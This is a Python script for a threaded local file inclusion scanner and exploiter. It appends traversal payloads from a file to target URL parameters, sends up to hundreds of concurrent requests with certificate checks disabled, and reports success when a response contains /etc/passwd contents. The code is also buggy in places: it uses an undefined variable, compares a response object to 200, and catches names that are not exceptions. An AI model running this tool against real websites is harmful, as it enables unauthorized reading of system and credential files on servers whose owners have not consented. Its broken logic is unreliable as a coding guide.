#!/usr/bin/python3


import requests
import sys
import threading
import argparse
import os
from termcolor import colored
import requests
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Style,Fore
from colorama import Style
from concurrent.futures import ThreadPoolExecutor
import time
from urllib.parse import urlparse
from threading import Thread
from queue import Queue
import queue
import pause
from apscheduler.schedulers.background import BackgroundScheduler
import apscheduler
from requests.exceptions import HTTPError
from requests.exceptions import ConnectionError

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

concurrent = 600
scheduler = BackgroundScheduler()
batch_size = 100

def banner():
    banner_text = """
        ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
        ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
        ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
        ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
        ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
        ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝

        version : v.0.1
        lfi scanner and exploiting .. 
        instagram : @sabarish_h4ck3r / created by sabarish
    """
    print(banner_text)

parser = argparse.ArgumentParser('description the lfi scanner', description=banner())
parser.add_argument('-f', '--file', help='specific url file contain the many url files')
parser.add_argument('-u', '--url', help='specific a single url for hacking')
parser.add_argument('-p', '--payload', help='specific payload for the hacking')
parser.add_argument('-t', '--thread', type=int, default=50, help="to boost the request")
parser.add_argument('-m', '--multiplex', help='specific to different proxy default local proxy')
parser.add_argument('-v', '--verbose', help='to print the request')
parser.add_argument('-s', '--scan', help='to spilt a scan a end points')
parser.add_argument('-o', '--output', help='you can store a the data')
args = parser.parse_args()

he = []


proxy = {'http': 'http://127.0.0.1:8080'}

gen_headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                 'Accept-Language':'en-US;',
                 'Accept-Encoding': 'gzip, deflate',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;',
                 'Connection':'close'}

def milliseconds():
        t = time.time()
        t_ms = int(t * 1000)
        return t_ms


def make_request(url, payload, proxy=None):
    try:
        for j in payload:
            jam = ("{}{}".format(url,j))
            he.append(jam)
#            print(len(he))
            urls= jam.strip()
                    #req = requests.get("{}{}".format(i,j))
            t = milliseconds()
            req = requests.get(urls, timeout=9, headers=gen_headers, proxies=proxy, verify=False)
            w = milliseconds() - t
            #print(f"Request {i}", end=" ")
            print(f"{urls}")     
            if(b"root:.*:0:0:" in req.content or req == 200):
                print(colored("[ * ] vulnerable bounty conform: ", 'red') + req.url ,'\n',req.content, h)
            if(b"root:x:0:0:" in req.content or req == 200):
#                    print(colored("bounty conform : ", 'red') + req.url + "-->" + urls)
                print(colored("[ * ] vulnerable bounty conform: ", 'red') + req.url ,'\n',req.content, h)
#                else:
#                    print("it's not a vulnerable urls [ * ]")

#					print colored("[+] '%s' [Vulnerable]" %website, "red")
#            if req == 200 or b"root:x:0:0:" in req.content:
#                print(colored("bounty conform : ", 'red') + req.url)""
    except HTTPError:
        pass
    except ConnectionError:
        pass
    except queue.Empty:
        pass
    except Queue.empty:
        pass
    except threading:
        pass
    except RuntimeError:
        pass
    except RuntimeWarning:
        pass
    except TimeoutError:
        pass
    except requests.ConnectTimeout:
        pass
    except requests.ConnectionError:
        pass
    except requests.Timeout:
        pass	
    except KeyboardInterrupt:
        quit()
    except requests.exceptions.MissingSchema:
        pass
    except AttributeError:
        pass
    except TypeError:
        pass
    except OSError:
        pass

def payload():
    with open('payload.txt', 'r') as f:
        line = f.readlines()
        return line

default_payload = payload()    


def checkFilename(filename):
    while(True):
        if(len(filename) > 0):
            if(filename[0] == '\''): 
                filename = filename[1:]
            if(filename[len(filename)-1] == '\''): 
                filename = filename[:-1]
            if(os.path.exists(filename)):
                return filename
                        
def checkHttp(url):
    if("http://" not in url and "https://" not in url):
        return "https://%s" %url
    return url

def correctUrl(url): # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='

    if(url[len(url)-1] == '='):
        return url
    eq = SubstrFind(url,"=")

    if(len(eq) == 0):
        #print ("\n[ERROR] Invalid URL syntax!\n")
        sys.exit()
    last = eq[len(eq)-1]

    return url[:(last+1)]

if args.url:
    gem = correctUrl(args.url)
    dhow = checkHttp(gem)
    type(gem)

if args.payload:
    dam = checkFilename(args.payload)
    with open(dam, 'r') as f:
        lines = f.readlines()

try:
    executor = ThreadPoolExecutor(500)
except threading:
    pass
except RuntimeError:
    pass
try:
    if args.thread:
        executor = ThreadPoolExecutor(args.thread)
    else:
        executor = ThreadPoolExecutor(500)
except RuntimeError:
    pass

def file_url():
    with open(args.file, 'r') as f:
        lines = f.readlines()
        return lines
    

try:
    if args.file: # making a request 
        list_url = file_url()
        for url_line in list_url:
            url_li = url_line.split('=')[0]+'='
            if args.payload:
                executor.submit(make_request,url_li, lines)
            elif args.multiplex:
                executor.submit(make_request,url_li, lines, proxy)
            elif args.url:
                executor.submit(make_request,gem, default_payload)
            else:
                executor.submit(make_request, url_li, default_payload)
except TypeError:
    pass
except RuntimeError:
    pass
except OSError:
    pass
except AttributeError:
    pass

scheduler.start()

q = Queue(concurrent * 200)
try:
    for i in range(concurrent):
        t = Thread(target=file_url)
        t.daemon = True
        t.start()
except TypeError:
    pass
except queue.Empty:
    pass
except RuntimeError:
    pass
except RuntimeWarning:
    pass
except KeyboardInterrupt:
    quit()
except AttributeError:
    pass
except OSError:
    pass





def scan_file():
    with open(args.scan, 'r') as f:
        lines1 = f.readlines()
    return lines1

def split_file(url):
        for linens in url:
            li = linens.split('=')[0]+'='
            convert_write(li)


if args.scan:
    a = scan_file()
    split_file(a)


def convert_write(lisps):
    with open ('text.txt', 'a+') as file:
        for linens in lisps:
            file.write(linens)

lam = "payload.txt"

def SubstrFind(resp, toFind):
    if(len(toFind) > len(resp)):
        return []

    found = False
    indexes = []

    for x in range(0,(len(resp)-len(toFind))+1):
        if(ord(resp[x]) == ord(toFind[0])):
            found = True
            for i in range(0,len(toFind)):
                if(ord(resp[x+i]) != ord(toFind[i])):
                    found = False
                    break
        if(found):
            indexes.append(x)
            found = False
            x += len(toFind)
        
    return indexes


def correctUrl(url): # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='

    if(url[len(url)-1] == '='):
        return url
    eq = SubstrFind(url,"=")

    if(len(eq) == 0):
        #print ("\n[ERROR] Invalid URL syntax!\n")
        sys.exit()
    last = eq[len(eq)-1]

    return url[:(last+1)]

pause.milliseconds(1)